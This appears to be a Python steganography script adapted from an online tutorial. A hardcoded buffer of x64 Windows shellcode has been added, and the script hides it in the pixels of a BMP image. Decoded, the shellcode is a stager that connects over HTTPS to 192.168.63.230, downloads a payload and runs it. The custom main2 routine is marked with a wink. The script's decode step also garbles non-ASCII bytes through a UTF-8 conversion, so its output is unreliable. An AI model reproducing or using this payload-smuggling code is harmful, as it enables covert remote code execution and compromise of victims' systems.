# MODIFIED SCRIPT
# ORIG: https://www.geeksforgeeks.org/image-based-steganography-using-python/

# Python program implementing Image Steganography

# PIL module is used to extract
# pixels of image and modify it
from PIL import Image

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66"
buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50"
buf += b"\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
buf += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48"
buf += b"\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
buf += b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
buf += b"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
buf += b"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe"
buf += b"\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1"
buf += b"\x49\xc7\xc2\x4c\x77\x26\x07\xff\xd5\x53\x53\x48\x89"
buf += b"\xe1\x53\x5a\x4d\x31\xc0\x4d\x31\xc9\x53\x53\x49\xba"
buf += b"\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0f\x00"
buf += b"\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x36\x33\x2e"
buf += b"\x32\x33\x30\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01"
buf += b"\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57"
buf += b"\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x56\x00\x00"
buf += b"\x00\x2f\x37\x41\x36\x32\x53\x72\x63\x47\x78\x57\x66"
buf += b"\x74\x37\x65\x7a\x76\x6a\x33\x42\x32\x31\x41\x61\x76"
buf += b"\x74\x56\x71\x75\x36\x78\x41\x67\x72\x69\x56\x65\x4e"
buf += b"\x5a\x4a\x38\x59\x52\x37\x33\x75\x56\x69\x4e\x75\x67"
buf += b"\x5f\x36\x66\x69\x30\x5f\x65\x38\x43\x31\x4b\x6b\x45"
buf += b"\x43\x47\x62\x50\x68\x4f\x45\x38\x46\x46\x69\x49\x53"
buf += b"\x41\x46\x6a\x44\x4d\x42\x39\x48\x00\x48\x89\xc1\x53"
buf += b"\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84"
buf += b"\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e"
buf += b"\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a"
buf += b"\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04"
buf += b"\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff"
buf += b"\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d"
buf += b"\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5"
buf += b"\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba"
buf += b"\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf"
buf += b"\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59\x6a\x40"
buf += b"\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00"
buf += b"\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5"
buf += b"\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
buf += b"\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12"
buf += b"\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20"
buf += b"\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75"
buf += b"\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2"
buf += b"\x56\xff\xd5"

# Convert encoding data into 8-bit binary
# form using ASCII value of characters
def genData(data):

		# list of binary codes
		# of given data
		newd = []

		for i in data:
			newd.append(format(i, "08b"))
		return newd

# Pixels are modified according to the
# 8-bit binary data and finally returned
def modPix(pix, data):

	datalist = genData(data)
	lendata = len(datalist)
	imdata = iter(pix)

	for i in range(lendata):

		# Extracting 3 pixels at a time
		pix = [value for value in imdata.__next__()[:3] +
								imdata.__next__()[:3] +
								imdata.__next__()[:3]]

		# Pixel value should be made
		# odd for 1 and even for 0
		for j in range(0, 8):
			if (datalist[i][j] == '0' and pix[j]% 2 != 0):
				pix[j] -= 1

			elif (datalist[i][j] == '1' and pix[j] % 2 == 0):
				if(pix[j] != 0):
					pix[j] -= 1
				else:
					pix[j] += 1
				# pix[j] -= 1

		# Eighth pixel of every set tells
		# whether to stop ot read further.
		# 0 means keep reading; 1 means thec
		# message is over.
		if (i == lendata - 1):
			if (pix[-1] % 2 == 0):
				if(pix[-1] != 0):
					pix[-1] -= 1
				else:
					pix[-1] += 1

		else:
			if (pix[-1] % 2 != 0):
				pix[-1] -= 1

		pix = tuple(pix)
		yield pix[0:3]
		yield pix[3:6]
		yield pix[6:9]

def encode_enc(newimg, data):
	w = newimg.size[0]
	(x, y) = (0, 0)

	for pixel in modPix(newimg.getdata(), data):

		# Putting modified pixels in the new image
		newimg.putpixel((x, y), pixel)
		if (x == w - 1):
			x = 0
			y += 1
		else:
			x += 1

# Encode data into image
def encode():
	img = input("Enter image name(with extension) : ")
	image = Image.open(img, 'r')

	data = input("Enter data to be encoded : ")
	if (len(data) == 0):
		raise ValueError('Data is empty')

	newimg = image.copy()
	encode_enc(newimg, data)

	new_img_name = input("Enter the name of new image(with extension) : ")
	newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))

# Decode the data in the image
def decode():
	img = input("Enter image name(with extension) : ")
	image = Image.open(img, 'r')

	data = ''
	imgdata = iter(image.getdata())

	while (True):
		pixels = [value for value in imgdata.__next__()[:3] +
								imgdata.__next__()[:3] +
								imgdata.__next__()[:3]]

		# string of binary data
		binstr = ''

		for i in pixels[:8]:
			if (i % 2 == 0):
				binstr += '0'
			else:
				binstr += '1'

		data += chr(int(binstr, 2))
		if (pixels[-1] % 2 != 0):
			return data

def encode2():
    img = Image.open("bliss.bmp", 'r')
    data = buf
    newimg = img.copy()
    encode_enc(newimg, data)
    newimg.save("bliss_enc.bmp", "bmp")

def decode2():
	img = Image.open("bliss_enc.bmp", 'r')
	imgdata = iter(img.getdata())
	data = ""
	while (True):
		pixels = [value for value in imgdata.__next__()[:3] +
								imgdata.__next__()[:3] +
								imgdata.__next__()[:3]]
		binstr = ""
		for i in pixels[:8]:
			if (i % 2 == 0):
				binstr += "0"
			else:
				binstr += "1"
		data += chr(int(binstr, 2))
		if (pixels[-1] % 2 != 0):
			return bytes(data, encoding="utf8").hex();

# Main Function
def main():
	a = int(input(":: Welcome to Steganography ::\n"
						"1. Encode\n2. Decode\n"))
	if (a == 1):
		encode()

	elif (a == 2):
		print("Decoded Word : " + decode())
	else:
		raise Exception("Enter correct input")

# Custom main function (non-interactive)
def main2():
	print("Encoding...")
	encode2()
	print("Decoding...")
	data = decode2()
	print(str(data))

# Driver Code
if __name__ == '__main__' :

	# Calling main function
	#main()
	main2()  # ;)
